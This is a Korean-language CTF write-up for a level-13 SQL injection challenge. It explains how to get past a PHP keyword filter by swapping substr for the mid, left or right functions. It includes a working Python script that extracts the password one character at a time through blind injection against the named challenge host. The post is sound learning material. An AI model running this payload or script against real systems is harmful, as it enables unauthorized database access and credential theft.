<img width="145" alt="스크린샷 2020-01-11 오후 6 05 40" src="https://user-images.githubusercontent.com/54495632/72201969-81c67c00-349d-11ea-9c69-874cbd4fe2c8.png">

Lv 13.

<img width="842" alt="스크린샷 2020-01-11 오후 6 05 45" src="https://user-images.githubusercontent.com/54495632/72201970-84c16c80-349d-11ea-828a-65a4ffeb1aa6.png">

$pw = $_GET['pw'];
  if(preg_match('/play|_|\.|\(|\)|info/i', $pw)){ exit("Nope !!");}
  if(preg_match('/substr/i', $pw)){ exit("Query is filtered :(");}

필터링 조건에서 substr이 생겼다.
substr이 필터링되는 경우 mid 함수로 대체 할 수 있다.

mid(문자열,index위치, 문자열 길이) 사용 결과와 파라미터 값은 substr과 동일하다.

mid 함수도 필터링되는 경우

left(문자열, 문자열 길이) - 왼쪽부터 길이만큼 출력

right(문자열,문자열 길이)- 오른쪽부터 길이만큼 출력

다음과 같은 함수로 대체할 수 있는데

substr(pw,2,1) 같은 형태는 left(right(pw,2),1) , right(left(pw,2),1) 과 같은 형태로 해결할 수 있다.

이 문제에선 mid를 사용하고자 한다.

<img width="785" alt="스크린샷 2020-01-11 오후 6 11 30" src="https://user-images.githubusercontent.com/54495632/72201998-d964e780-349d-11ea-9d4a-081dd8c01dde.png">

그 전에 우선 다음과 같이 pw의 길이를 구했다.

<img width="775" alt="스크린샷 2020-01-11 오후 6 11 41" src="https://user-images.githubusercontent.com/54495632/72202005-e255b900-349d-11ea-91fb-b5d5536bd051.png">

pw 길이가 8

<img width="266" alt="스크린샷 2020-01-11 오후 6 13 15" src="https://user-images.githubusercontent.com/54495632/72202053-509a7b80-349e-11ea-96d8-6ef092eb24d2.png">

P@Ssw0rd

다음과 같은 코드를 통해 pw를 찾았다.

import requests

cookies={'PHPSESSID':'55u9gmc98r1hrdgmohnr0upf75'}
url="http://crackus.jeju.kr/chall13.php?"

pw=""
for i in range(1,9):
    for j in range(33,128):

        query="pw=%27or+ascii%28mid%28pw%2C"+str(i)+"%2C1%29%29%3D"+str(j)+"%23"
        geturl=url+query
        res=requests.get(geturl,cookies=cookies)
        if((res.text).find("Good J0b :)")>0):
            pw+=chr(j)
            print (pw)
            break

print ("finish pw :"+pw)


<img width="518" alt="스크린샷 2020-01-11 오후 6 15 55" src="https://user-images.githubusercontent.com/54495632/72202061-6f990d80-349e-11ea-9de4-5073ae994050.png">

<img width="721" alt="스크린샷 2020-01-11 오후 6 16 01" src="https://user-images.githubusercontent.com/54495632/72202063-7293fe00-349e-11ea-86c4-5243210430ef.png">